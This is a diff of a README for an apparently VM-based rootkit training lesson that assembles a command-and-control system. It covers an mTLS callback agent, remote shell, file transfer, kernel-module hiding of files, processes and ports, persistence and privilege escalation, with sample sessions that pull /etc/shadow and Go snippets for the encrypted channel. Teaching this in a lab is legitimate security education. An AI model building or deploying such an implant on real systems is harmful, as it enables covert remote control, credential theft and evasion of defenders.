@@ -1,38 +1,65 @@
 # M02: Remote Control
 
-L15 through L19 built the pieces: mTLS transport, mkdir bridge, command dispatch,
-shell execution, file transfer.
-Now assemble them into a complete C2 system.
-The operator types commands in a TUI on the host.
-The server relays them over mTLS to the agent in the VM.
-The agent executes them (directly, or via mkdir for kernel commands).
-tcpdump on the wire sees nothing but HTTPS to a normal-looking server.
+L15 through L19 built the pieces: mTLS transport, mkdir bridge, command
+dispatch, shell execution, file transfer.
+M02 assembles them into one remote-control system.
+The operator provides a terminal and browser dashboard on the host.
+The server relays commands over mTLS to the agent in the VM.
+The agent executes them directly or translates them into kernel commands.
+
+## What you will observe
+
+Start the target and operator independently.
+The callback then appears in both operator interfaces, and a command crosses the
+encrypted connection and returns the target's real output:
+
+```console
+rklings> shell id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Workspace
+
+```text
+exercises/M02-remote-control
+├── cmd
+│   ├── agent
+│   │   └── main.go
+│   └── server
+│       ├── main.go
+│       ├── tui.go
+│       └── web.go
+├── go.mod
+└── go.sum
+```
+
+Complete both ends of the protocol.
+The agent owns target-side execution; the server owns connections, target
+selection, and the two operator views.
 
 ## Architecture
 
 ```text
-  Operator (host)                 Network               Agent (VM)
-  +-------------------+                               +------------------+
-  |  TUI              |                               |  mTLS client     |
-  |  reeflective/     |         mTLS :443             |                  |
-  |  console          +------------------------------->  dispatch loop   |
-  |                   |    TLS 1.3, mutual auth       |                  |
-  |  lipgloss         <-------------------------------+  handlers:       |
-  |  styled output    |    plaintext over TLS         |    PING          |
-  +-------------------+                               |    STATUS        |
-  |  Webapp :8080     |                               |    SHELL <cmd>   |
-  |  (browser UI)     |                               |    DOWNLOAD <f>  |
-  +-------------------+                               |    UPLOAD <f>    |
-                                                      |    HIDE <t> <v>  |
-                                                      |    PERSIST       |
-                                                      |    ESCALATE      |
-                                                      +------------------+
-                                                             |
-                                                             v
-                                                      +------------------+
-                                                      |  rklings.ko      |
-                                                      |  (via mkdir)     |
-                                                      +------------------+
++--------------------+
+| OPERATOR HOST      |
+| terminal prompt    |
+| browser UI :8080   |
+| target selection   |
++----------+---------+
+           | TLS 1.3 + mTLS
+           v
++--------------------+
+| TARGET VM          |
+| mTLS client        |
+| dispatch loop      |
+| command handlers   |
++----------+---------+
+           | mkdir control
+           v
++--------------------+
+| rklings.ko         |
+| local controls     |
++--------------------+
 ```
 
 ## Protocol
@@ -62,25 +89,27 @@ File transfers send a decimal byte count, then that many raw bytes.
 
 ## Command set
 
-| Command | Agent action |
-|---------|-------------|
-| PING | Reply PONG |
-| STATUS | Report agent state (uptime, PID, uid) |
-| SHELL <cmd> | exec.Command("sh", "-c", cmd), return output |
-| DOWNLOAD <path> | Send file size + raw bytes |
-| UPLOAD <path> | Receive file size + raw bytes, write to path |
-| HIDE FILE <name> | mkdir rklings.h.f.<name> |
-| HIDE PID <pid> | mkdir rklings.h.i.<pid> |
-| HIDE PORT <port> | mkdir rklings.h.p.<port> |
-| HIDE CONTENT <str> | mkdir rklings.h.c.<str> |
-| PERSIST | mkdir rklings.persist |
-| ESCALATE | mkdir rklings.e |
-| ESCALATE <pid> | mkdir rklings.e.<pid> |
+| Command            | Agent action                                 |
+| ------------------ | -------------------------------------------- |
+| PING               | Reply PONG                                   |
+| STATUS             | Report PID and uid                           |
+| SHELL <cmd>        | exec.Command("sh", "-c", cmd), return output |
+| DOWNLOAD <path>    | Send file size + raw bytes                   |
+| UPLOAD <path>      | Receive file size + raw bytes, write to path |
+| HIDE FILE <name>   | mkdir rklings.h.f.<name>                     |
+| HIDE PID <pid>     | mkdir rklings.h.i.<pid>                      |
+| HIDE PORT <port>   | mkdir rklings.h.p.<port>                     |
+| HIDE CONTENT <str> | mkdir rklings.h.c.<str>                      |
+| UNHIDE <type> <v>  | mkdir rklings.u.<type>.<same value>          |
+| PERSIST            | mkdir rklings.persist                        |
+| ESCALATE           | mkdir rklings.e                              |
+| ESCALATE <pid>     | mkdir rklings.e.<pid>                        |
 
-## Operator TUI
+## Operator terminal
 
-The server uses reeflective/console for the interactive operator shell.
-lipgloss styles the output: green for success, red for errors, dim for metadata.
+M02 keeps a small line-oriented prompt so each request and response remains
+visible.
+P00 reuses the protocol in the full terminal operator.
 
 TUI commands map to protocol commands:
 
@@ -95,42 +124,59 @@ TUI commands map to protocol commands:
   OK
 
   operator> download /etc/shadow
-  Saved: /tmp/shadow (1.2 KB)
+  saved 1247 bytes -> .rklings/downloads/etc/shadow
 ```
 
-## Webapp
+The terminal writes the raw response to disk, so text and binary files follow
+the same path.
+The browser keeps an explicit preview and save action.
 
-A minimal HTTP server on 127.0.0.1:8080 provides:
-- Agent status (connected/disconnected, last seen)
-- Command input form
-- Output display
-- File browser for downloads
+## Operator dashboard
 
-## You write
+The integrated brutalist dashboard on `127.0.0.1:8080` provides agent-reported
+target status, one-shot commands, a persistent PTY shell, file browsing,
+upload/download, process and port snapshots, command history, and connection
+events.
+Every snapshot and transfer runs through the connected agent; the server does
+not generate sample target data.
+
+Sequence:
+
+```text
+L18: one command -> one result
+M02: persistent guest PTY -> framed input/output -> browser terminal
+```
+
+## Implement it
 
 Two binaries:
 
-**cmd/agent/main.go** (~150 lines):
+`cmd/agent/main.go`:
+
 - mTLS dial with embedded certs
 - Command dispatch loop (bufio.Scanner)
-- Handlers: PING, STATUS, SHELL, DOWNLOAD, UPLOAD, HIDE, PERSIST, ESCALATE
+- Handlers: PING, STATUS, SHELL, PTY, DOWNLOAD, UPLOAD, HIDE, PERSIST, ESCALATE
 - mkdir bridge for kernel commands
 
-**cmd/server/main.go** (~80 lines):
+`cmd/server/main.go`:
+
 - mTLS listener (server cert + client CA verification)
 - Accept agent connection, store reference
 - Start TUI and webapp goroutines
 
-**cmd/server/tui.go** (~120 lines):
-- reeflective/console setup with command registration
+`cmd/server/tui.go`:
+
+- standard-library input loop and command parsing
 - Each TUI command sends protocol line to agent, reads response
-- lipgloss styling for output
+- clear success and error output
 
-**cmd/server/web.go** (~80 lines):
-- net/http on 127.0.0.1:8080
-- Status endpoint, command endpoint, simple HTML UI
+**cmd/server/web.go**:
 
-## API
+- serve the built React dashboard on `127.0.0.1:8080`
+- `/ws` for state, commands, snapshots, and downloads
+- `/shell` bridges xterm input and resize events to the guest PTY
+
+## Useful interfaces
 
 ```go
 // Agent: mTLS dial
@@ -147,22 +193,20 @@ conn, _ := tls.Dial("tcp", serverAddr, &tls.Config{
 serverCert, _ := tls.LoadX509KeyPair(certFile, keyFile)
 clientPool := x509.NewCertPool()
 clientPool.AppendCertsFromPEM(caCertPEM)
-ln, _ := tls.Listen("tcp", ":443", &tls.Config{
+ln, _ := tls.Listen("tcp", ":8443", &tls.Config{
     Certificates: []tls.Certificate{serverCert},
     ClientCAs:    clientPool,
     ClientAuth:   tls.RequireAndVerifyClientCert,
     MinVersion:   tls.VersionTLS13,
 })
 
-// TUI: reeflective/console
-app := console.New("rklings")
-app.AddCommand("shell", "Execute command on agent", shellHandler)
-app.AddCommand("hide", "Hide target via kernel module", hideHandler)
-app.Start()
+// Terminal input loop
+reader := bufio.NewReader(os.Stdin)
+line, err := reader.ReadString('\n')
 
-// Webapp
-http.HandleFunc("/api/status", statusHandler)
-http.HandleFunc("/api/command", commandHandler)
+// Operator web transport
+http.HandleFunc("/ws", stateAndCommandWebSocket)
+http.HandleFunc("/shell", shellWebSocket)
 http.ListenAndServe("127.0.0.1:8080", nil)
 
 // mkdir bridge (agent side)
@@ -171,9 +215,26 @@ os.Mkdir("/tmp/rklings.h.f."+name, 0755)
 
 ## Test it
 
-Terminal 1 (host, server):
+Start the target first:
+
+```sh
+./rklings run M02
 ```
-$ rklings run m02
+
+The VM loads the lesson module and starts the callback agent, which retries
+until an operator exists.
+In a second host terminal, start the independent operator:
+
+```sh
+./rklings serve M02
+```
+
+The `rklings>` prompt appears there after the mTLS callback.
+The browser is available simultaneously at `http://127.0.0.1:8080`.
+
+Use the terminal operator:
+
+```text
 rklings> ping
 PONG (8ms)
 rklings> shell uname -r
@@ -181,27 +242,24 @@ rklings> shell uname -r
 rklings> hide file secret.txt
 OK
 rklings> download /etc/hostname
-Saved: /tmp/hostname (12 bytes)
+[+] saved 7 bytes -> .rklings/downloads/etc/hostname
 ```
 
-Terminal 2 (verify traffic):
-```
-$ tcpdump -i lo port 443 -c 10
-... TLS 1.3 ... Application Data ...
-(no plaintext visible)
-```
+Or open the browser dashboard:
 
-Browser:
-```
+```text
 http://127.0.0.1:8080
-(agent status: connected, command input, output display)
+(dashboard: targets, shell, files, processes, ports, logs, events)
 ```
 
 ## Validate
 
+```sh
+./rklings validate M02
 ```
-$ rklings validate m02
-  [+] server starts on :443 with mTLS
+
+```text
+  [+] operator starts on isolated dynamic ports
   [+] agent connects with valid client cert
   [+] TLS 1.3 negotiated
   [+] PING/PONG round-trip
@@ -209,13 +267,12 @@ $ rklings validate m02
   [+] DOWNLOAD transfers file correctly
   [+] HIDE FILE triggers mkdir in VM
   [+] tcpdump shows only encrypted traffic
-  [+] webapp responds on :8080
+  [+] operator relay and web listener respond
   PASS
 ```
 
 ## Next
 
-Everything works remotely.
-But the agent binary is on disk, the .ko was loaded from a file, and the
-process shows in ps.
-L20 through L24 add the tradecraft to disappear completely.
+The operator can control the target remotely, but the deployed files, process,
+callback, and local activity remain easy to inspect.
+L20 through L24 reduce each of those visible deployment traces in turn.
